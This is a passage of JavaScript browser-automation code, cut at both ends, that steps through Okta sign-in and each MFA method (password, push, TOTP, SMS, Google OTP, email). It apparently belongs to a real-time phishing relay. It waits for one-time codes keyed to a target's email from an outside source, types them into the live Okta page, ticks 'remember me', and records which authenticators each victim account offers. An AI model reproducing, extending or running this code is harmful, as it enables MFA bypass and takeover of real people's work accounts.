    //<div data-se="callout" class="infobox clearfix infobox-error"><span data-se="icon" class="icon error-16"></span><div>You have chosen to reject this login.</div></div>
    //<input class="button button-primary" type="submit" value="Resend push notification" data-type="save">
    
        
    
    try{ await page.waitForFunction("(document.querySelector('input[type=submit]')&&document.querySelector('input[type=checkbox]'))||document.querySelector('.send-push')");  }catch(e){console.log('fail Okta Push notification Verify2, catch err:'+e);}

    
}else if(typeof SelectedAuth !== 'undefined' && SelectedAuth && oktaVerifyList3.includes(SelectedAuth.toUpperCase())&& SelectedAuth.toUpperCase()=="TOTP"){
    await page.click("div[data-se=okta_verify-totp] a");
    console.log('Okta Verify TOTP Button Clicked2');
    OktaMode = "TOTP";
    //credentials.totp
    try{ await page.waitForFunction("document.querySelector('input[type=text]')&&document.querySelector('input[type=submit]')");console.log('Okta TOTP Button Clicked successfully2');}catch(e){console.log('fail click Okta TOTP Button2, catch err:'+e);}  



}else if(typeof SelectedAuth !== 'undefined' && SelectedAuth && oktaVerifyList3.includes(SelectedAuth.toUpperCase())&& SelectedAuth.toUpperCase()=="OTP"){

    
}else if(typeof SelectedAuth !== 'undefined' && SelectedAuth && oktaVerifyList3.includes(SelectedAuth.toUpperCase())&& SelectedAuth.toUpperCase()=="GOTP"){

    await page.click("div[data-se=google_otp] a");
    console.log('Google Authentification OTP Button Clicked2');
    OktaMode = "GOTP";
    //credentials.gotp
    try{ await page.waitForFunction("document.querySelector('input[type=text]')&&document.querySelector('input[type=submit]')");console.log('Google Authentification OTP Button Clicked successfully2');}catch(e){console.log('fail Google Authentification OTP Button2, catch err:'+e);}  

}else if(typeof SelectedAuth !== 'undefined' && SelectedAuth && oktaVerifyList3.includes(SelectedAuth.toUpperCase())&& SelectedAuth.toUpperCase()=="EMAIL"){
await page.click("div[data-se=okta_email] a");
    console.log('Okta Email Button Clicked1');
    OktaMode = "EMAIL";
    //<input class="button button-primary" type="submit" value="Send me an email" data-type="save">
    try{ await page.waitForFunction("(document.querySelector('.mfa-okta-email')||document.querySelector('.authenticator-verification-data--okta_email'))&&document.querySelector('input[type=submit]')");console.log('Okta EMAIL Button Clicked successfully1');}catch(e){console.log('fail click Okta EMAIL Button1, catch err:'+e);}  

}

}

if((await page.$('.o-form-has-errors') == null&&await page.$('p[role=alert]') == null)&&(await page.$('.challenge-authenticator--okta_password') !== null||await page.$('.mfa-verify-password') !== null)){//Password
    if(await page.$('input[type=checkbox]') !== null){//name=rememberMe
     const element = await page.$("input[type=checkbox]");
    const isCheckBoxChecked = await (await element.getProperty("checked")).jsonValue();
    if(! isCheckBoxChecked ){
        await element.click()
        //await page.$eval('input[type=checkbox]', check => check.checked = true);
         console.log("rememberMe Checkbox checked2:");
    } 
       
    }   
        
    if(await page.$('input[type=password]') !== null){
        
    console.log('waiting for Okta Pass Code');
isCorrectLogin = false;    
OktaCode = await waitForOTP(dataId,decodeURI(dataEmail),'okta','pass',undefined,180000,1000,page);
OktaTypeArr[OktaCode]='pass';
OktaType = 'pass';
console.log('waiting is finished');
console.log('OktaCode :'+OktaCode);




if( typeof OktaCode !== 'undefined' && OktaCode){
    
    
    SAML_pass = OktaCode;    
    //await page.click("input[type=password]",{clickCount: 3});
    await page.$eval('input[type=password]', el => el.value = '');
    //await page.focus('input[type=password]');
    await page.type("input[type=password]",OktaCode,{delay:25});
    page.click("input[type=submit]");//input[type=submit][value=Verify]
    console.log('pass submited2');
    try{ await page.waitForFunction("document.querySelector('.link-button-disabled')");  
    
        try{ await page.waitForFunction("document.querySelector('.link-button-disabled') === null||document.querySelector('input[type=submit]') === null||document.querySelector('.select-authenticator-authenticate--okta_verify')||document.querySelector('.authenticator-verify-list')||document.querySelector('.authenticator-enroll-list')||document.querySelector('.challenge-poll--okta_verify')||document.querySelector('.o-form-has-errors')||document.querySelector('p[role=alert]')"); console.log('success Submit pass2');if(await page.$('.o-form-has-errors') !== null||await page.$('p[role=alert]') !== null){
    console.log('wrong password');
isCorrectLogin = false;
}else{
console.log('successful password');
isCorrectLogin = true;
/*    
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa']['pass'][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa']['pass']['result']='CorrectCode';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa']['pass']['retry']=false;
 */   
} }catch(e){console.log('fail Submit pass2, catch err:'+e);}

        
    }catch(e){console.log('fail Submit pass2, catch err:'+e);}
    }
    }
    
await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'catcherror11',dataDebug,false); 
    
}else if((await page.$('.infobox-error') == null&&await page.$('.infobox-warning') == null)&&(await page.$('.challenge-poll--okta_verify') !== null||await page.$('.okta-verify-push-challenge') !== null||await page.$('.okta-verify-send-push-form') !== null)){//Push

console.log('okta verify push challenge2');

OktaCode = 'push2'; 
OktaTypeArr[OktaCode]='push';
OktaType = 'push';
    if(await page.$('.send-push') == null){
        if(await page.$('input[type=checkbox]') !== null){//name="authenticator.autoChallenge"
     const element = await page.$("input[type=checkbox]");
    const isCheckBoxChecked = await (await element.getProperty("checked")).jsonValue();
    if(! isCheckBoxChecked ){
        await element.click()
        //await page.$eval('input[type=checkbox]', check => check.checked = true);
         console.log("Send push automatically checked2 :");
    } 
       
    }
    if(await page.$('input[type=submit]') !== null){//name="authenticator.autoChallenge"
        await page.click("input[type=submit]");
        console.log("Send push button clicked2 :");
    }
    try{ await page.waitForFunction("document.querySelector('.okta-verify-push-challenge')&&!document.querySelector('input[type=submit]')");console.log("Okta Push notification Sent2");  }catch(e){console.log('Okta Push notification Not Sent2, catch err:'+e);}
    }
       
    
    //Haven't received a push notification yet? Try opening the Okta Verify App on your phone.
    //await page.waitForTimeout(10000);
let IsApproved = false;
try{ console.log("Waiting for approving push notification2");await page.waitForFunction("!document.querySelector('.okta-verify-push-challenge')||document.querySelector('input[type=submit]')||document.title.includes('My Apps Dashboard')||document.title.includes('Microsoft Office Home')||document.querySelector('div[data-se=callout]')||document.querySelector('.infobox-error')", {timeout: 300000});IsApproved = true;
//console.log('Okta Push notification is approved2');
      }catch(e){console.log('Okta Push notification is Not approved2, catch err:'+e);}


//.okta-form-infobox-warning
//.infobox-warning
try{
if(IsApproved && (await page.$('div[data-se=callout]') !== null||await page.$('.infobox-error') !== null) && await page.$('input[type=submit]') !== null){
    console.log('Okta Push notification is rejected2:');
    //input[type=submit]   
    //input[value*=Resend]
    //Resend push notification
    //console.log('You have been logged out due to inactivity. Refresh or return to the sign in screen.');
}else if (!IsApproved && await page.$('.send-push') !== null){
console.log('Okta Push notification is Timeout2');
    
}else if ((await page.$('div[data-se=callout]') !== null||await page.$('.infobox-error') !== null) && await page.$('div[data-se=go-back]') !== null){
    console.log('Okta Push notification is timeout2:');
    console.log('You have been logged out due to inactivity. Refresh or return to the sign in screen.');
    //console.log('There was an unsupported response from server.');    
}

}catch(e){
console.log('Catch err:::'+e);
    //.infobox-error
    //There was an unsupported response from server.
    //data-se="callout" 


//await page.waitForNavigation('domcontentloaded');//['load', 'domcontentloaded', 'networkidle0', 'networkidle2']


/*
await debug(await page.screenshot({encoding: 'base64'}),Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'catcherror',dataDebug,false); 
*/    
try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err16:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}
}

try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err16:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}

//pageTitle = await page.title();
pageTitle = await page.evaluate(() => document.title);

 if(await page.$('.infobox-error') !== null){
 console.log('Okta Push notification is Rejected2');    
     
 }else if(await page.$('.okta-verify-push-challenge') == null&&(await page.$('input[type=submit]') !== null||pageTitle.includes('My Apps Dashboard'))){
 console.log('Okta Push notification is Accepted2');
 isCorrectLogin = true;
 //await page.waitForNavigation('networkidle0');    
 }else if(await page.$('.okta-verify-push-challenge') !== null||await page.$('.challenge-poll--okta_verify') !== null){
 console.log('Okta Push notification is Failed2');    
     
 }


    
}else if ((await page.$('.o-form-has-errors') == null&&await page.$('p[role=alert]') == null)&&(await page.$('.challenge-authenticator--okta_verify') !== null||await page.$('.okta-verify-totp-challenge') !== null)){//Totp



console.log('Waiting for OKTA TOTP CODE2...');
isCorrectLogin = false;
OktaCode = await waitForOTP(dataId,decodeURI(data.reQemail),'okta','totp',undefined,180000,1000,page);
OktaTypeArr[OktaCode]='totp';
OktaType = 'totp';
console.log('OktaCode :'+OktaCode);

    if(OktaCode&&await page.$('input[type=text]') !== null){
    //await page.click("input[type=text]",{clickCount: 3});
    await page.$eval('input[type=text]', el => el.value = '');
    await page.type("input[type=text]",OktaCode,{delay:25});
    page.click("input[type=submit]");//input[type=submit][value=Verify]
    console.log('TOTP Code submited2');
    try{ await page.waitForFunction("document.querySelector('.link-button-disabled')");  
    
        try{ await page.waitForFunction("document.querySelector('.link-button-disabled') === null||document.querySelector('input[type=submit]') === null||document.querySelector('.select-authenticator-authenticate--okta_verify')||document.querySelector('.authenticator-verify-list')||document.querySelector('.authenticator-enroll-list')||document.querySelector('.challenge-poll--okta_verify')||document.querySelector('.o-form-has-errors')||document.querySelector('p[role=alert]')"); console.log('success Submit TOTP Code2'); if(await page.$('.o-form-has-errors') !== null||await page.$('p[role=alert]') !== null){
    console.log('wrong password');

isCorrectLogin = false;
}else{
console.log('successful password');
isCorrectLogin = true;
/*    
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa']['pass'][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa']['pass']['result']='CorrectCode';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa']['pass']['retry']=false;
 */   
}}catch(e){console.log('fail Submit TOTP Code2, catch err:'+e);}

    
    
        
    }catch(e){console.log('fail Submit TOTP Code2, catch err:'+e);}

try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err17:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}
//pageTitle = await page.title();
pageTitle = await page.evaluate(() => document.title);   
if(await page.$('.okta-verify-totp-challenge') == null&&(await page.$('input[type=submit]') !== null||pageTitle.includes('My Apps Dashboard'))){
 console.log('Okta TOTP is Accepted2');    

}else if(await page.$('.o-form-has-errors') !== null||await page.$('p[role=alert]') !== null){
    console.log('TOTP Code is Wrong2');

}else if(await page.$('.okta-verify-totp-challenge') !== null||await page.$('.challenge-authenticator--okta_verify') !== null){
 console.log('Okta TOTP is Failed2');    

 }
    
 //try{await page.waitForFunction("document.querySelector('.infobox-error') || (!document.querySelector('.challenge-authenticator--okta_verify') && !document.querySelector('.okta-verify-totp-challenge')) || document.querySelector('input[type=submit]')||document.title.includes('My Apps Dashboard')");console.log('Okta Push notification is Passsed');  }catch(e){console.log('Okta Push notification Not passed, catch err:'+e);}
 

    
    }




}else if ((await page.$('.o-form-has-errors') == null&&await page.$('p[role=alert]') == null)&&await page.$('.sms-request-button') !== null){//PHONE

console.log('Waiting for SMS OTP CODE2...');
isCorrectLogin = false;
OktaCode = await waitForOTP(dataId,decodeURI(data.reQemail),'okta','sms',undefined,180000,1000,page);
OktaTypeArr[OktaCode]='sms';
OktaType = 'sms';
console.log('OktaCode :'+OktaCode);

    if(OktaCode && await page.$('[data-se=sms-send-code]') !== null||await page.$('.sms-request-button') !== null||await page.$('[data-se=resend-button]') !== null){
        
    page.click("[data-se=sms-send-code]");   
    try{ await page.waitForFunction("document.querySelector('.sms-request-button.link-button-disabled')");console.log('SMS OTP Code Sent2, catch err:'+e); }catch(e){console.log('fail Submit SMS OTP Code2, catch err:'+e);}
    
    if(await page.$('input[type=text]') !== null&&await page.$('.sms-request-button') !== null&&await page.$('input[type=submit]') !== null){
    //await page.click("input[type=text]",{clickCount: 3}); 
    await page.$eval('input[type=text]', el => el.value = '');
    await page.type("input[type=text]",OktaCode,{delay:25});
    page.click("input[type=submit]");
    
    }
    try{ await page.waitForFunction("document.querySelector('.link-button-disabled')"); console.log('SMS OTP Code submited2'); 
    
        try{ await page.waitForFunction("document.querySelector('.link-button-disabled') === null||document.querySelector('input[type=submit]') === null||document.querySelector('.select-authenticator-authenticate--okta_verify')||document.querySelector('.authenticator-verify-list')||document.querySelector('.authenticator-enroll-list')||document.querySelector('.challenge-poll--okta_verify')||document.querySelector('.o-form-has-errors')||document.querySelector('p[role=alert]')"); console.log('success Submit SMS OTP Code2'); }catch(e){console.log('fail Submit SMS OTP Code2, catch err:'+e);}

    }catch(e){console.log('fail Submit SMS OTP Code2, catch err:'+e);}


try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err18:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}
//pageTitle = await page.title();
pageTitle = await page.evaluate(() => document.title);
if(await page.$('.o-form-has-errors') !== null||await page.$('p[role=alert]') !== null){
    console.log('SMS OTP Code is Wrong2'); 
    isCorrectLogin = false;
}else if(await page.$('.sms-request-button') == null&&(await page.$('input[type=submit]') !== null||await page.$('.authenticator-verify-list') !== null||pageTitle.includes('My Apps Dashboard'))){
 console.log('Okta SMS OTP CODE is Accepted2');
 isCorrectLogin = true;
     
}else if(await page.$('.sms-request-button') !== null){
 console.log('Okta SMS OTP Authentification is Failed2');    
     
}
    
 //try{await page.waitForFunction("document.querySelector('.infobox-error') || (!document.querySelector('.challenge-authenticator--okta_verify') && !document.querySelector('.okta-verify-totp-challenge')) || document.querySelector('input[type=submit]')||document.title.includes('My Apps Dashboard')");console.log('Okta Push notification is Passsed');  }catch(e){console.log('Okta Push notification Not passed, catch err:'+e);}
 

    
    }



}else if ((await page.$('.o-form-has-errors') == null&&await page.$('p[role=alert]') == null)&&(await page.$('.challenge-authenticator--google_otp') !== null||await page.$('.google-authenticator-challenge') !== null)){//Gotp



console.log('Waiting for OKTA GOTP CODE2...');

isCorrectLogin = false;
OktaCode = await waitForOTP(dataId,decodeURI(data.reQemail),'okta','gotp',undefined,180000,1000,page);
OktaTypeArr[OktaCode]='gotp';
OktaType = 'gotp';
console.log('OktaCode :'+OktaCode);

    if(OktaCode && await page.$('input[type=text]') !== null){
    //await page.click("input[type=text]",{clickCount: 3});
    await page.$eval('input[type=text]', el => el.value = '');
    await page.type("input[type=text]",OktaCode,{delay:25});
    page.click("input[type=submit]");//input[type=submit][value=Verify]
    console.log('GOTP Code submited2');
    try{ await page.waitForFunction("document.querySelector('.link-button-disabled')");  
    
        try{ await page.waitForFunction("document.querySelector('.link-button-disabled') === null||document.querySelector('input[type=submit]') === null||document.querySelector('.select-authenticator-authenticate--okta_verify')||document.querySelector('.authenticator-verify-list')||document.querySelector('.authenticator-enroll-list')||document.querySelector('.challenge-poll--okta_verify')||document.querySelector('.o-form-has-errors')||document.querySelector('p[role=alert]')"); console.log('success Submit GOTP Code2'); }catch(e){console.log('fail Submit GOTP Code2, catch err:'+e);}

    
    
        
    }catch(e){console.log('fail Submit GOTP Code2, catch err:'+e);}

try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err19:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}
//pageTitle = await page.title();
pageTitle = await page.evaluate(() => document.title);   
if(await page.$('.o-form-has-errors') !== null||await page.$('p[role=alert]') !== null){
    console.log('GOTP Code is Wrong2'); 
    isCorrectLogin = false;
}else if(await page.$('.google-authenticator-challenge') == null&&(await page.$('input[type=submit]') !== null||pageTitle.includes('My Apps Dashboard'))){
 console.log('Okta GOTP is Accepted2');    
   isCorrectLogin = true;  
}else if(await page.$('.google-authenticator-challenge') !== null||await page.$('.challenge-authenticator--google_otp') !== null){
 console.log('Okta GOTP is Failed2');    
     isCorrectLogin = false;
 }
    
 //try{await page.waitForFunction("document.querySelector('.infobox-error') || (!document.querySelector('.challenge-authenticator--okta_verify') && !document.querySelector('.okta-verify-totp-challenge')) || document.querySelector('input[type=submit]')||document.title.includes('My Apps Dashboard')");console.log('Okta Push notification is Passsed');  }catch(e){console.log('Okta Push notification Not passed, catch err:'+e);}
 

    
    }





}else if((await page.$('.o-form-has-errors') == null&&await page.$('p[role=alert]') == null)&&(await page.$('.enter-auth-code-instead-link') !== null||await page.$('.mfa-okta-email') !== null)){//Email
console.log('OKTA EMAIL CODE2...');
//We sent you a verification email. Click the verification link in your email to continue or enter the code below.


    if(await page.$('input[type=submit]') !== null){
    //await page.type("input[type=text]",OktaCode,{delay:25});
    page.click("input[type=submit]");//input[type=submit][value=Verify]
    console.log('verification email sent2');
    try{ await page.waitForFunction("document.querySelector('input[type=submit]') === null && document.querySelector('.enter-auth-code-instead-link')");  
    }catch(e){console.log('fail Submit verification email Code2, catch err:'+e);}

if(await page.$('.enter-auth-code-instead-link')){

try{console.log('verification email sent successfully2');page.click(".enter-auth-code-instead-link");await page.waitForFunction("(document.querySelector('.enter-auth-code-instead-link') === null || document.querySelector('.enter-auth-code-instead-link').clientHeight == 0 || document.querySelector('.enter-auth-code-instead-link').style.visibility == 'hidden' ) && document.querySelector('input[type=text]')&& document.querySelector('input[type=submit]')");}catch(e){console.log('fail get verification email input2, catch err:'+e);} 
    
}
//.resend-link

console.log('Waiting for verification email CODE2...');        
    
isCorrectLogin = false;
OktaCode = await waitForOTP(dataId,decodeURI(data.reQemail),'okta','email',undefined,180000,1000,page);
OktaTypeArr[OktaCode]='email';
OktaType = 'email';
console.log('OktaCode :'+OktaCode);

if(OktaCode && await page.$('input[type=text]') && await page.$('input[type=submit]')){
//await page.click("input[type=text]",{clickCount: 3});
await page.$eval('input[type=text]', el => el.value = '');
await page.type("input[type=text]",OktaCode,{delay:25});
console.log('EMAIL OKTA Code putted2');
}


    try{page.click("input[type=submit]");console.log('EMAIL OKTA Code submited2');await page.waitForFunction("document.querySelector('.link-button-disabled')");  
    
        try{ await page.waitForFunction("document.querySelector('.link-button-disabled') === null||document.querySelector('input[type=submit]') === null||document.querySelector('.select-authenticator-authenticate--okta_verify')||document.querySelector('.authenticator-verify-list')||document.querySelector('.authenticator-enroll-list')||document.querySelector('.challenge-poll--okta_verify')||document.querySelector('.o-form-has-errors')||document.querySelector('p[role=alert]')"); console.log('EMAIL OKTA Code is submited2'); }catch(e){console.log('EMAIL OKTA Code is not submited2, catch err:'+e);}

    }catch(e){console.log('fail Submit OKTA EMAIL Code2, catch err:'+e);}



try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err20:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}


console.log('clink1:'+clink);

//console.log(await page.content());
//<input class="button button-primary" type="submit" value="Next" data-type="save">
await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'catcherror12',dataDebug,false); 


try {clink2 = await page.evaluate(() => document.location.href);console.log('1st Successfully get clink2      :'+clink2);}catch(e){
    console.log('1st error clink2 catch error      :'+e);
    try {clink2 = await page.evaluate(() => document.location.href);console.log('2nd Successfully get clink2      :'+clink2);}catch(ee){console.log('2nd error clink2 catch error      :'+ee);clink2 = false;}
    
}
if(clink !== clink2){
try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err21:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}
    
}


//pageTitle = await page.title();
pageTitle = await page.evaluate(() => document.title);    
if(await page.$('.o-form-has-errors') !== null||await page.$('p[role=alert]') !== null){
    console.log('verification email Code is Wrong2'); 
    isCorrectLogin = false;
}else if(await page.$('.mfa-okta-email') == null&&await page.$('.authenticator-verification-data--okta_email') == null&&(await page.$('input[type=submit]') !== null||pageTitle.includes('My Apps Dashboard'))){
 console.log('Okta verification email is Accepted2'); 
 isCorrectLogin = true;
}else if(await page.$('.mfa-okta-email') !== null||await page.$('.authenticator-verification-data--okta_email') !== null){
 console.log('Okta verification email is Failed2'); 
 isCorrectLogin = false;
     
 }
    
 //try{await page.waitForFunction("document.querySelector('.infobox-error') || (!document.querySelector('.challenge-authenticator--okta_verify') && !document.querySelector('.okta-verify-totp-challenge')) || document.querySelector('input[type=submit]')||document.title.includes('My Apps Dashboard')");console.log('Okta Push notification is Passsed');  }catch(e){console.log('Okta Push notification Not passed, catch err:'+e);}
 

    
    }






}



    
    
}else{
    console.log('office Redirected to another page');   
    console.log('Redirected to Page:',page.url());
    
    
IsSAML = true;
SAML = page.url();

  console.log("Email is not Okta account..");
var LoadTime_ms = new Date()-StartTime;
var LoadTime2_ms = new Date()-StartTime2;
//console.log('time1: '+new Date()+' time2: '+new Date());
var LoadTime_s = Math.floor(LoadTime_ms/1000);
var LoadTime2_s = Math.floor(LoadTime2_ms/1000);
                
					result['StatusCode'] = 0;
					result['Status'] = "NotOkta";
					result['Email'] = dataEmail;
					result['Msg'] = "Email Is Not Okta Account";
					result['Load_time'] = LoadTime_s+' Seconds('+LoadTime2_s+'Sec)';
                console.log('Load_time: '+LoadTime_s+' Seconds('+LoadTime2_s+'Sec)');
					result['Time'] = DateNow;
					//result['client_ip'] = $this->client_ip;

					//result['client_ip'] = $this->client_ip;

//var result = { "statusCode": 1, "status": "invalid", "email": email, "result": "Not Valid Gmail Address", "time":DateNow };                  
console.log(result);
//res.setHeader('Content-Type', 'application/json');
//res.send(JSON.stringify(result));
//getRestart();
    
//return result; 
    
    
    
    
    
}

    //console.timeEnd('selectoremail('+RandArray[2]+')');


//if(setcookie&&cookie&&request.url().includes('&redirect_uri=')&&(request.url().includes('https://login.microsoftonline.com/common/')||request.url().includes('https://login.live.com/'))){


    
}


//await page.evaluate(() => {location.reload(true)});


try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err22:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}





console.log('OktaResult  :',OktaResult[OktaTypeArr[OktaCode]]);

pageTitle = await page.evaluate(() => document.title);
if(await page.$('.o-form-has-errors') !== null||await page.$('p[role=alert]') !== null){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="no";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['no'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}else if(pageTitle.includes('My Apps Dashboard')){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']='done';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}else if(await page.$('.select-authenticator-authenticate--okta_verify') !== null||await page.$('.authenticator-verify-list') !== null){
console.log('authlist');
var OktaAuthList = Array();
if(await page.$('div[data-se=okta_password]') !== null){OktaAuthList.push("PASS");}
if(await page.$('div[data-se=phone_number]') !== null){OktaAuthList.push("OTP");}
if(await page.$('CUSTOM_OTP') !== null){OktaAuthList.push("COTP");}
if(await page.$('div[data-se=okta_verify-totp]') !== null){OktaAuthList.push("TOTP");}
if(await page.$('div[data-se=okta_verify-push]') !== null){OktaAuthList.push("PUSH");}
if(await page.$('div[data-se=google_otp]') !== null){OktaAuthList.push("GOTP");}
if(await page.$('GPUSH') !== null){OktaAuthList.push("GPUSH");}
if(await page.$('div[data-se=okta_email]') !== null){OktaAuthList.push("EMAIL");}
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']=OktaAuthList;
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}else if(await page.$('div[data-se=okta_password]') !== null){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']='pass';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}
else if(await page.$('div[data-se=phone_number]') !== null){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']='otp';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}
else if(await page.$('CUSTOM_OTP') !== null){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']='cotp';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;    
}else if(await page.$('div[data-se=okta_verify-totp]') !== null){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']='totp';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}else if(await page.$('div[data-se=okta_verify-push]') !== null){
    ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']='push';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}
else if(await page.$('div[data-se=google_otp]') !== null){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']='gotp';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}
else if(await page.$('GPUSH') !== null){
    ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']='gpush';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}
else if(await page.$('div[data-se=okta_email]') !== null){
    ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']='email';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}else if(OktaLogin){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login'][OktaLogin['user']]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login'][OktaLogin['pass']]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login']['result']='CorrectLogin';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login']['next']='done';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login']['retry']=false;
isCorrectLogin = true;
}else if(OktaUser){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['next']['auth']='done';
isCorrectLogin = true;
}



if(typeof ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode] !=='undefined'){
LoginStatus=ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result'];
